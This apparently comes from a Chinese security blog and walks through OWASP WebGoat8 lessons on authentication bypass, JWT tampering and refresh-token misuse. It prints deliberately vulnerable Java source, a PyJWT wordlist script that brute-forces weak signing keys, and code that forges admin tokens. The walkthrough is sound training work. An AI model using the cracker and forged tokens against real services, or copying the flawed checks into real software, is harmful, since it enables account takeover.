> WebGoat8系列文章：[前情回顾](https://www.freebuf.com/vuls/214039.html)

**数字观星 Jack
Chan(Saturn)，再会篇为Java代码审计入门:WebGoat8系列的第二篇，意为与WebGoat8再次相会。本篇我们将一起看看WebGoat8中的Authentication
Bypasses和JWT相关安全问题。**

##  ****Authentication Bypasses 认证绕过 ****

这节课程首先给了我们一个2016年的PayPal双因子密码重置的漏洞：攻击者通过去掉安全问题验证报文中的两个安全问题，结果通过了验证，从而达到了身份认证绕过。  
![](https://image.3001.net/images/20191012/1570851111_5da1492781b91.jpg!small)

看完真实案例后，我们的随堂作业是要绕过一个相似的密码重置功能。这个时候，很容易就会尝试运用刚刚学会的姿势，截包将两个安全问题删除，发包。然后就收到：Not
quite, please try again.

很真实，应验了那句话：老师教的和案例展示的都不会考。  
![](https://image.3001.net/images/20191012/1570851130_5da1493adc033.jpg!small)从刚刚截包中获取路径“/auth-bypass/verify-account”，全局去搜索，追踪到相关代码：

VerifyAccount.java

    
    
    package org.owasp.webgoat.plugin;
    import com.google.common.collect.Lists;
    import org.jcodings.util.Hash;
    import org.owasp.webgoat.assignments.AssignmentEndpoint;
    import org.owasp.webgoat.assignments.AssignmentHints;
    import org.owasp.webgoat.assignments.AssignmentPath;
    import org.owasp.webgoat.assignments.AttackResult;
    import org.owasp.webgoat.session.UserSessionData;
    import org.owasp.webgoat.session.WebSession;
    import org.springframework.beans.factory.annotation.Autowired;
    import org.springframework.web.bind.annotation.*;
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.util.Collections;
    import java.util.HashMap;
    import java.util.List;
    import java.util.Map;
    /**
     * Created by jason on 1/5/17.
     */
    @AssignmentPath("/auth-bypass/verify-account")
    @AssignmentHints({"auth-bypass.hints.verify.1", "auth-bypass.hints.verify.2", "auth-bypass.hints.verify.3", "auth-bypass.hints.verify.4"})
    public class VerifyAccount extends AssignmentEndpoint {
        @Autowired
        private WebSession webSession;
        @Autowired
        UserSessionData userSessionData;
        @PostMapping(produces = {"application/json"})
        @ResponseBody
        public AttackResult completed(@RequestParam String userId, @RequestParam String verifyMethod, HttpServletRequest req) throws ServletException, IOException {
            AccountVerificationHelper verificationHelper = new AccountVerificationHelper();
            Map<String,String> submittedAnswers = parseSecQuestions(req);
            //进行作弊检测
            if (verificationHelper.didUserLikelylCheat((HashMap)submittedAnswers)) {
                return trackProgress(failed()
                .feedback("verify-account.cheated")
                .output("Yes, you guessed correcctly,but see the feedback message")
                .build());
            }
            // else
            //进行账号验证
            if (verificationHelper.verifyAccount(new Integer(userId),(HashMap)submittedAnswers)) {
                userSessionData.setValue("account-verified-id", userId);
                return trackProgress(success()
                .feedback("verify-account.success")
                .build());
            } else {
                return trackProgress(failed()
                .feedback("verify-account.failed")
                .build());
            }
        }
    //安全问题解析，将包含“secQuestion”的参数名及对应参数存放在userAnswers（类型为Map）中。
        private HashMap<String,String> parseSecQuestions (HttpServletRequest req) {
            Map <String,String> userAnswers = new HashMap<>();
            List<String> paramNames = Collections.list(req.getParameterNames());
            for  (String paramName : paramNames) {
                //String paramName = req.getParameterNames().nextElement();
                if (paramName.contains("secQuestion")) {
                    userAnswers.put(paramName,req.getParameter(paramName));
                }
            }
            return (HashMap)userAnswers;
        }
    }

其中主要用到：

AccountVerificationHelper.java

    
    
    package org.owasp.webgoat.plugin;
    import org.jcodings.util.Hash;
    import org.owasp.webgoat.session.UserSessionData;
    import org.springframework.beans.factory.annotation.Autowired;
    import java.util.HashMap;
    import java.util.Map;
    /**
     * Created by appsec on 7/18/17.
     */
    public class AccountVerificationHelper {
        //simulating database storage of verification credentials
        private  static final Integer verifyUserId = new Integer(1223445);
        private static final Map<String,String> userSecQuestions = new HashMap<>();
        static {
            userSecQuestions.put("secQuestion0","Dr. Watson");
            userSecQuestions.put("secQuestion1","Baker Street");
        }
        private static final Map<Integer,Map> secQuestionStore = new HashMap<>();
        static {
            secQuestionStore.put(verifyUserId,userSecQuestions);
        }
        // end 'data store set up'
        // this is to aid feedback in the attack process and is not intended to be part of the 'vulnerable' code
        public boolean didUserLikelylCheat(HashMap<String,String> submittedAnswers) {
            boolean likely = false;
            if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) {
                likely = true;
            }
            if ((submittedAnswers.containsKey("secQuestion0") && submittedAnswers.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) &&
                    (submittedAnswers.containsKey("secQuestion1") && submittedAnswers.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) ) {
                likely = true;
            } else {
                likely = false;
            }
            return likely;
        }
        //end of cheating check ... the method below is the one of real interest. Can you find the flaw?
        public boolean verifyAccount(Integer userId, HashMap<String,String> submittedQuestions ) {
            //short circuit if no questions are submitted
            if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
                return false;
            }
            if (submittedQuestions.containsKey("secQuestion0") && !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) {
                return false;
            }
            if (submittedQuestions.containsKey("secQuestion1") && !submittedQuestions.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
                return false;
            }
            // else
            return true;
        }
    }

verifyAccount流程如下：

//安全问题解析，将包含“secQuestion”的参数名及对应参数存放在userAnswers（类型为Map）中。

 **parseSecQuestions**

如果paramName.contains("secQuestion"）参数名包含"secQuestion"，则将参数名作为userAnswers的key，参数值作为value存入。

//作弊检测，检测请求的验证是否有作弊，有则不通过检验

 **verificationHelper.didUserLikelylCheat((HashMap)submittedAnswers)**

> 1.请求中的secQuestion数目等于系统内虚拟的secQuestion数目（2条），则为作弊。
>
> 2.请求中含有secQuestion0和secQuestion1参数及其值各自等于系统中的对应问题答案。（即回答出正确答案），是作弊。

 **verificationHelper.verifyAccount(new
Integer(userId),(HashMap)submittedAnswers)**

> 1.如果请求报文的安全问题条数不等于系统虚拟的安全问题条数，则返回失败。
>
> 2.如果请求报文的安全问题有secQuestion0且答案错误，则返回失败。
>
> 3.如果请求报文的安全问题有secQuestion1且答案错误，则返回失败。
>
> 4.前面的条件都通过，返回成功。

分析：  
从流程可以知道，我们想要绕过认证，需要在请求中发送安全问题（含“secQuestion”字符串即为安全问题）条数等于系统虚拟的安全问题条数（2条），回答出secQuestion0和secQuestion1算作弊，回答不出算失败。那么我们构造含

“secQuestion”字符串但并不是secQuestion0和secQuestion1的参数2个，就可以绕过这些检测了。  
￼![](https://image.3001.net/images/20191012/1570851166_5da1495e73305.jpg!small)  
总结：  
黑盒测试时，可尝试删除安全问题等方式绕过认证。

##  **JWT**

JSON Web Token (JWT)是一个开放标准(RFC
7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。

一条JWT是被base64编码过的，包含了三段，头部，声明（也称payload），签名。中间以“.”间隔。  
![](https://image.3001.net/images/20191012/1570851203_5da149831b21b.jpg!small)我们可以将一条JWT拿到<https://jwt.io/#debugger>去解码一下。JWT：

    
    
    eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1Njk4MDk1MDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.lHBU1BzLM9_GB6qfcSljmCreLyNytlv5aGIx2QKZBHva1Y1XB9LST7lE3UcbGTToUKoMNIxkqcCdaX-J7yDyHQ

HEADER中是使用的算法HS512（HMACSHA512512），PAYLOAD中承载了自定义信息，SIGNATURE是将header，payload，以及密钥使用HMACSHA512算法计算得出签名。

所以payload中不应该存放诸如密码等敏感信息，传递JWT应使用安全的通信协议，以防被窃取。  
![](https://image.3001.net/images/20191012/1570851228_5da1499c43886.jpg!small)

下图展示身份认证及JWT颁发过程：  
![](https://image.3001.net/images/20191012/1570851244_5da149ac03934.jpg!small)

随堂作业：篡改JWT，成为admin用户，重置投票。  
![](https://image.3001.net/images/20191012/1570851261_5da149bde03e6.jpg!small)

到了看代码的时候了，追踪“/JWT/votings”：

    
    
    package org.owasp.webgoat.plugin;
    import com.google.common.collect.Maps;
    import io.jsonwebtoken.Claims;
    import io.jsonwebtoken.Jwt;
    import io.jsonwebtoken.JwtException;
    import io.jsonwebtoken.Jwts;
    import io.jsonwebtoken.impl.TextCodec;
    import org.apache.commons.lang3.StringUtils;
    import org.owasp.webgoat.assignments.AssignmentEndpoint;
    import org.owasp.webgoat.assignments.AssignmentHints;
    import org.owasp.webgoat.assignments.AssignmentPath;
    import org.owasp.webgoat.assignments.AttackResult;
    import org.owasp.webgoat.plugin.votes.Views;
    import org.owasp.webgoat.plugin.votes.Vote;
    import org.springframework.http.HttpStatus;
    import org.springframework.http.MediaType;
    import org.springframework.http.ResponseEntity;
    import org.springframework.http.converter.json.MappingJacksonValue;
    import org.springframework.web.bind.annotation.*;
    import javax.annotation.PostConstruct;
    import javax.servlet.http.Cookie;
    import javax.servlet.http.HttpServletResponse;
    import java.time.Duration;
    import java.time.Instant;
    import java.util.Date;
    import java.util.Map;
    import static java.util.Comparator.comparingLong;
    import static java.util.Optional.ofNullable;
    import static java.util.stream.Collectors.toList;
    /**
     * @author nbaars
     * @since 4/23/17.
     */
    @AssignmentPath("/JWT/votings")
    @AssignmentHints({"jwt-change-token-hint1", "jwt-change-token-hint2", "jwt-change-token-hint3", "jwt-change-token-hint4", "jwt-change-token-hint5"})
    public class JWTVotesEndpoint extends AssignmentEndpoint {
        public static final String JWT_PASSWORD = TextCodec.BASE64.encode("victory");
        private static String validUsers = "TomJerrySylvester";
        private static int totalVotes = 38929;
        private Map<String, Vote> votes = Maps.newHashMap();
        @PostConstruct
        public void initVotes() {
            votes.put("Admin lost password", new Vote("Admin lost password",
                    "In this challenge you will need to help the admin and find the password in order to login",
                    "challenge1-small.png", "challenge1.png", 36000, totalVotes));
            votes.put("Vote for your favourite",
                    new Vote("Vote for your favourite",
                            "In this challenge ...",
                            "challenge5-small.png", "challenge5.png", 30000, totalVotes));
            votes.put("Get it for free",
                    new Vote("Get it for free",
                            "The objective for this challenge is to buy a Samsung phone for free.",
                            "challenge2-small.png", "challenge2.png", 20000, totalVotes));
            votes.put("Photo comments",
                    new Vote("Photo comments",
                            "n this challenge you can comment on the photo you will need to find the flag somewhere.",
                            "challenge3-small.png", "challenge3.png", 10000, totalVotes));
        }
        @GetMapping("/login")
        public void login(@RequestParam("user") String user, HttpServletResponse response) {
            if (validUsers.contains(user)) {
                Claims claims = Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(10))));
                claims.put("admin", "false");
                claims.put("user", user);
                String token = Jwts.builder()
                        .setClaims(claims)
                        .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD)
                        .compact();
                Cookie cookie = new Cookie("access_token", token);
                response.addCookie(cookie);
                response.setStatus(HttpStatus.OK.value());
                response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            } else {
                Cookie cookie = new Cookie("access_token", "");
                response.addCookie(cookie);
                response.setStatus(HttpStatus.UNAUTHORIZED.value());
                response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            }
        }
        @GetMapping
        @ResponseBody
        public MappingJacksonValue getVotes(@CookieValue(value = "access_token", required = false) String accessToken) {
            MappingJacksonValue value = new MappingJacksonValue(votes.values().stream().sorted(comparingLong(Vote::getAverage).reversed()).collect(toList()));
            if (StringUtils.isEmpty(accessToken)) {
                value.setSerializationView(Views.GuestView.class);
            } else {
                try {
                    Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                    Claims claims = (Claims) jwt.getBody();
                    String user = (String) claims.get("user");
                    if ("Guest".equals(user) || !validUsers.contains(user)) {
                        value.setSerializationView(Views.GuestView.class);
                    } else {
                        value.setSerializationView(Views.UserView.class);
                    }
                } catch (JwtException e) {
                    value.setSerializationView(Views.GuestView.class);
                }
            }
            return value;
        }
        @PostMapping(value = "{title}")
        @ResponseBody
        @ResponseStatus(HttpStatus.ACCEPTED)
        public ResponseEntity<?> vote(@PathVariable String title, @CookieValue(value = "access_token", required = false) String accessToken) {
            if (StringUtils.isEmpty(accessToken)) {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            } else {
                try {
                    Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                    Claims claims = (Claims) jwt.getBody();
                    String user = (String) claims.get("user");
                    if (!validUsers.contains(user)) {
                        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
                    } else {
                        ofNullable(votes.get(title)).ifPresent(v -> v.incrementNumberOfVotes(totalVotes));
                        return ResponseEntity.accepted().build();
                    }
                } catch (JwtException e) {
                    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
                }
            }
        }
        @PostMapping("reset")
        public @ResponseBody
        AttackResult resetVotes(@CookieValue(value = "access_token", required = false) String accessToken) {
            if (StringUtils.isEmpty(accessToken)) {
                return trackProgress(failed().feedback("jwt-invalid-token").build());
            } else {
                try {
                    Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                    Claims claims = (Claims) jwt.getBody();
                    boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
                    if (!isAdmin) {
                        return trackProgress(failed().feedback("jwt-only-admin").build());
                    } else {
                        votes.values().forEach(vote -> vote.reset());
                        return trackProgress(success().build());
                    }
                } catch (JwtException e) {
                    return trackProgress(failed().feedback("jwt-invalid-token").output(e.toString()).build());
                }
            }
        }
    }

关注以下代码块，我们可以看到生成及颁发JWT的过程。

    
    
    @GetMapping("/login")
        public void login(@RequestParam("user") String user, HttpServletResponse response) {
            if (validUsers.contains(user)) {
                Claims claims = Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(10))));
                claims.put("admin", "false");
                claims.put("user", user);
                String token = Jwts.builder()
                        .setClaims(claims)
                        .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD)
                        .compact();
                Cookie cookie = new Cookie("access_token", token);
                response.addCookie(cookie);
                response.setStatus(HttpStatus.OK.value());
                response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            } else {
                Cookie cookie = new Cookie("access_token", "");
                response.addCookie(cookie);
                response.setStatus(HttpStatus.UNAUTHORIZED.value());
                response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            }
        }

然后看到随堂作业中要重置投票的相关代码块。我们可以看到这一句：Jwt jwt =
Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);使用签名密钥去解析了请求过来的JWT，获取claims中的admin参数的值，通过这个值来确认是否admin权限。

思路：获取密钥，使用<https://jwt.io/#debugger>或Java或python篡改JWT中admin参数为true。

问题也随之而来，如何获取密钥?当然我们可以通过代码直接找到JWT_PASSWORD的值，但是这样的话，这道随堂作业就没什么味道了，所以我们再自己加一道题中题：JWT弱密钥爆破。

    
    
    @PostMapping("reset")
        public @ResponseBody
        AttackResult resetVotes(@CookieValue(value = "access_token", required = false) String accessToken) {
            if (StringUtils.isEmpty(accessToken)) {
                return trackProgress(failed().feedback("jwt-invalid-token").build());
            } else {
                try {
                    Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                    Claims claims = (Claims) jwt.getBody();
                    boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
                    if (!isAdmin) {
                        return trackProgress(failed().feedback("jwt-only-admin").build());
                    } else {
                        votes.values().forEach(vote -> vote.reset());
                        return trackProgress(success().build());
                    }
                } catch (JwtException e) {
                    return trackProgress(failed().feedback("jwt-invalid-token").output(e.toString()).build());
                }
            }
        }

**题中题：JWT弱密钥爆破**

这一题的解题思路引用@yangyangwithgnu发表的文章
[全程带阻：记一次授权网络攻防演练（上）](https://www.freebuf.com/vuls/211842.html)中，利用PyJWT编写脚本爆破JWT弱密码。脚本逻辑

> 1.若签名直接校验 **成功** （原文为失败，猜测为作者手误），则 key_ 为有效密钥；
>
> 2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError,
> jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError,
> jwt.exceptions.InvalidIssuedAtError,
> jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；
>
> 3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；
>
> 4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。

利用脚本可爆出JWT弱密钥为：victory  
![](https://image.3001.net/images/20191012/1570851294_5da149dea88f4.jpg!small)脚本如下：  
JWT_crack.py  
//import jwt 需要安装依赖包PyJWT

    
    
    import jwt
    import termcolor
    if __name__ == "__main__":
        jwt_str = R'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1Njk3MjI2NDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.Y2WgbXt9wjv4p4BdM_tA9f05sG-_n1ugojijOZMXx2_Gld_Ip4dOazj9K3iWVC68W_7_HEyu2_c0qSjtqDC0Vg'
        with open('/YOUR-PATH/Top1000.txt') as f:
            for line in f:
                key_ = line.strip()
                try:
                    jwt.decode(jwt_str, verify=True, key=key_)
                    print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                    break
                except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                    print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                    break
                except jwt.exceptions.InvalidSignatureError:
                    print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
                    continue
            else:
                print('\r', '\bsorry! no key be found.')

使用爆破出来的密钥：victory和<https://jwt.io/#debugger>篡改JWT中admin参数为true获得篡改后的JWT。  
![](https://image.3001.net/images/20191012/1570851628_5da14b2c8d76c.jpg!small)也可以使用python3
的PyJWT去获得JWT

    
    
    import jwt
    # payload
    token_dict = {
        "iat": 1570415291,
        "admin": "true",
        "user": "Tom"
    }
    key = "victory"
    # headers
    headers = {
        "typ": "JWT",
        "alg": "HS512"
    }
    # 调用jwt库,生成json web token
    jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                           key,
                           algorithm="HS512",# 指明签名算法方式, 默认是HS256，需要与headers中"alg"保持一致。
                           headers=headers # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                           ) 
    print("jwt_token")
    print(jwt_token)

得到：  
![](https://image.3001.net/images/20191012/1570851645_5da14b3d932c6.jpg!small)

    
    
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NzA0MTUyOTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.2uqgOomtrYjU9h2gYFkzTxh_coX0dcuiONhiEZN**Y_VCu7k8imLxOBer0Ws5qnC0X3e56eEVKVIqVGz8OZvZQ

也可以使用Java：

    
    
    import io.jsonwebtoken.Claims;
    import io.jsonwebtoken.Jwts;
    import io.jsonwebtoken.impl.TextCodec;
    public class baseencodeJWTcryptotest {
        public static String JWT_PASSWORD = TextCodec.BASE64.encode("victory");
        public static void createJWTToken() {
            Claims claims = Jwts.claims();
            claims.put("iat", 1570415291);
            claims.put("admin", "True");
            claims.put("user", "Tom");
            String token = Jwts.builder().setClaims(claims).setHeaderParam("typ", "JWT")
                    .setHeaderParam("alg","HS512")
                    .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD).compact();
            System.out.println(token);
        }
        public static void main(String[] args) {
            baseencodeJWTcryptotest.createJWTToken();
        }
    }

![](https://image.3001.net/images/20191012/1570851665_5da14b5128f36.jpg!small)得到：

    
    
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NzA0MTUyOTEsImFkbWluIjoiVHJ1ZSIsInVzZXIiOiJUb20ifQ.cQTTGQK75NUnzi8tN1xHeQNXjVmqlH3U_9ynyccCZjUogTM7A5GV7V570LXIuvPgbSPfEAjpOqxL8woWXHrCIg

使用篡改的JWT，发送reset报文。  
"congratulations",成功了。  
jwt.io：  
![](https://image.3001.net/images/20191012/1570851684_5da14b64dc2fc.jpg!small)python：  
![](https://image.3001.net/images/20191012/1570851714_5da14b823983f.jpg!small)Java:![](https://image.3001.net/images/20191012/1570851733_5da14b9540c05.jpg!small)

总结：

> 开发人员不应在JWT中暴露敏感信息，可使用工具将截获的JWT解析查看是否包含敏感信息。
>
> JWT弱口令爆破可以离线进行。
>
> JWT的安全性非常依赖密钥的长度及复杂度，建议密钥设置为32位及以上长度的随机字符。

##  **Refreshing a token**

就如同session会有存活时长一样，JWT的access_token也是有相类似的机制。session失活后，系统会要求用户再次身份验证，通过则重新颁发session；JWT则可使用refresh
token去刷新access token而无需再次身份验证。  
登陆获取 access token, refresh token  
![](https://image.3001.net/images/20191012/1570851828_5da14bf4da70c.jpg!small)

WebGoat中提到：

应在服务器端存储足够的信息，以验证用户是否仍然受信任。您可以考虑的事情有很多，比如存储IP地址，跟踪使用refresh token的次数（在access
token的有效时间窗口中多次使用刷新令牌可能表示奇怪的行为，您可以撤销所有token，让用户再次进行身份验证）。还要跟踪哪个access
token属于哪个refresh token，否则攻击者可能会使用攻击者的refresh token为其他用户获取新的access
token，请参阅<https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation>,还可以检查用户的IP地址或地理位置。如果需要发出一个新的令牌，请检查位置是否仍然相同，如果不同，则撤销所有令牌，并让用户再次进行身份验证。

这段话中关键信息是，服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh
token去刷新B用户的access token。  
WebGoat对于使用JWT的建议：

> 使用jwt令牌的最佳位置是服务器之间的通信。在普通的web应用程序中，最好使用普通的旧cookies。

随堂作业：

**Refreshing a token**  
![](https://image.3001.net/images/20191012/1570851857_5da14c11ef4ee.jpg!small)题目：查看日志文件，找到让Tom为这些书买单的方法。  
日志文件：  
![](https://image.3001.net/images/20191012/1570851902_5da14c3ebab68.jpg!small)

    
    
    194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
    194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 200 12783 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
    194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/login HTTP/1.1" 200 212 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
    194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/addItems HTTP/1.1" 404 249 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
    195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" "-"

可以看到有一条token，和一些与refresh相关的url信息。拿token去[https://jwt.io/#debugger，可以看到：](https://jwt.io/#debugger%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%EF%BC%9A)

是属于Tom，exp的时间是2018年（已过期）。  
![](https://image.3001.net/images/20191012/1570852063_5da14cdfe46f2.jpg!small)使用logfile中的token直接checkout，返回已过期提示。（Authorization头根据源码构造，Bearer
可加可不加。 ）  

代码：![](https://image.3001.net/images/20191012/1570852091_5da14cfb6db69.jpg!small)JWTRefreshEndpoint.java

    
    
    package org.owasp.webgoat.plugin;
    import com.google.common.collect.Lists;
    import com.google.common.collect.Maps;
    import io.jsonwebtoken.*;
    import org.apache.commons.lang3.RandomStringUtils;
    import org.owasp.webgoat.assignments.AssignmentEndpoint;
    import org.owasp.webgoat.assignments.AssignmentHints;
    import org.owasp.webgoat.assignments.AssignmentPath;
    import org.owasp.webgoat.assignments.AttackResult;
    import org.owasp.webgoat.session.WebSession;
    import org.springframework.beans.factory.annotation.Autowired;
    import org.springframework.http.HttpStatus;
    import org.springframework.http.MediaType;
    import org.springframework.http.ResponseEntity;
    import org.springframework.web.bind.annotation.PostMapping;
    import org.springframework.web.bind.annotation.RequestBody;
    import org.springframework.web.bind.annotation.RequestHeader;
    import org.springframework.web.bind.annotation.ResponseBody;
    import java.util.Date;
    import java.util.List;
    import java.util.Map;
    import java.util.concurrent.TimeUnit;
    /**
     * @author nbaars
     * @since 4/23/17.
     */
    @AssignmentPath("/JWT/refresh/")
    @AssignmentHints({"jwt-refresh-hint1", "jwt-refresh-hint2", "jwt-refresh-hint3", "jwt-refresh-hint4"})
    public class JWTRefreshEndpoint extends AssignmentEndpoint {
        public static final String PASSWORD = "bm5nhSkxCXZkKRy4";
        private static final String JWT_PASSWORD = "bm5n3SkxCX4kKRy4";
        private static final List<String> validRefreshTokens = Lists.newArrayList();
        //登陆模块
        @PostMapping(value = "login", consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
        public @ResponseBody
        ResponseEntity follow(@RequestBody Map<String, Object> json) {
            String user = (String) json.get("user");
            String password = (String) json.get("password");
            //验证用户名Jerry和秘密
            if ("Jerry".equals(user) && PASSWORD.equals(password)) {
                //通过则颁发token
                return ResponseEntity.ok(createNewTokens(user));
            }
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        //创建token模块
        private Map<String, Object> createNewTokens(String user) {
            Map<String, Object> claims = Maps.newHashMap();
            claims.put("admin", "false");
            claims.put("user", user);
            String token = Jwts.builder()
                    .setIssuedAt(new Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10)))
                    .setClaims(claims)
                    .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD)
                    .compact();
            Map<String, Object> tokenJson = Maps.newHashMap();
            String refreshToken = RandomStringUtils.randomAlphabetic(20);
            validRefreshTokens.add(refreshToken);
            tokenJson.put("access_token", token);
            tokenJson.put("refresh_token", refreshToken);
            return tokenJson;
        }
        //checkout模块
        @PostMapping("checkout")
        public @ResponseBody
        AttackResult checkout(@RequestHeader("Authorization") String token) {
            try {
                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
                Claims claims = (Claims) jwt.getBody();
                String user = (String) claims.get("user");
                if ("Tom".equals(user)) {
                    return trackProgress(success().build());
                }
                return trackProgress(failed().feedback("jwt-refresh-not-tom").feedbackArgs(user).build());
            } catch (ExpiredJwtException e) {
                return trackProgress(failed().output(e.getMessage()).build());
            } catch (JwtException e) {
                return trackProgress(failed().feedback("jwt-invalid-token").build());
            }
        }
        //刷新 token
        @PostMapping("newToken")
        public @ResponseBody
        ResponseEntity newToken(@RequestHeader("Authorization") String token, @RequestBody Map<String, Object> json) {
            String user;
            String refreshToken;
            try {
                Jwt<Header, Claims> jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
                user = (String) jwt.getBody().get("user");
                refreshToken = (String) json.get("refresh_token");
            } catch (ExpiredJwtException e) {
                user = (String) e.getClaims().get("user");
                refreshToken = (String) json.get("refresh_token");
            }
            //仅校验是否存在user和refreshToken，未校验两者对应关系，存在漏洞
            if (user == null || refreshToken == null) {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            } else if (validRefreshTokens.contains(refreshToken)) {
                validRefreshTokens.remove(refreshToken);
                return ResponseEntity.ok(createNewTokens(user));
            } else {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            }
        }
    }

存在问题的代码块：

仅校验是否存在user和refreshToken，未校验两者对应关系，导致漏洞产生。

    
    
    //刷新 token
        @PostMapping("newToken")
        public @ResponseBody
        ResponseEntity newToken(@RequestHeader("Authorization") String token, @RequestBody Map<String, Object> json) {
            String user;
            String refreshToken;
            try {
                Jwt<Header, Claims> jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
                user = (String) jwt.getBody().get("user");
                refreshToken = (String) json.get("refresh_token");
            } catch (ExpiredJwtException e) {
                user = (String) e.getClaims().get("user");
                refreshToken = (String) json.get("refresh_token");
            }
            //仅校验是否存在user和refreshToken，未校验两者对应关系，存在漏洞
            if (user == null || refreshToken == null) {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            } else if (validRefreshTokens.contains(refreshToken)) {
                validRefreshTokens.remove(refreshToken);
                //返回JWT user的新token
                return ResponseEntity.ok(createNewTokens(user));
            } else {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            }
        }

思路：

> 从logfile中获取到Tom到过期JWT
>
> 利用账号密码：Jerry/bm5nhSkxCXZkKRy4 拿到Jerry账号的refresh token
>
> 利用Jerry的refresh token 和Tom的过期access token去刷新一下
>
> 拿到刷新后的token 结账
>
> 从logfile中获取到Tom到过期JWT

